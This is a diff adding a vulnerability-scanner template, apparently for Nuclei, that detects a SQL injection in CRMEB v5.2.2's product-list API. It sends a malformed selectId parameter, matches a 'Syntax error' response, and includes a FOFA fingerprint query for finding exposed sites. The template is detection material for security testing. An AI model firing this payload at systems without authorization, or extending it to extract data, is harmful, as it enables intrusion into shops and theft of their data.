@@ -1,0 +1,30 @@
+id: crmeb-opensource-store-sqli-disclosure
+info:
+  name: CRMEB v.5.2.2 - SQL 注入漏洞
+  author: leadlife
+  severity: high
+  description: CRMEB v.5.2.2 中的 SQL 注入漏洞允许远程攻击者通过 ProductController.php 文件中的 getProductList 函数获取敏感信息。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/CRMEB%E5%BC%80%E6%BA%90%E5%95%86%E5%9F%8Ev5.2.2%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified:
+    fofa-query: icon_hash="-847565074"
+  tags: crmeb, disclosure
+
+
+http:
+  - raw:
+      - |
+        GET /api/products?limit=20&priceOrder=&salesOrder=&selectId=) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Syntax error"
+
+      - type: status
+        status:
+          - 200
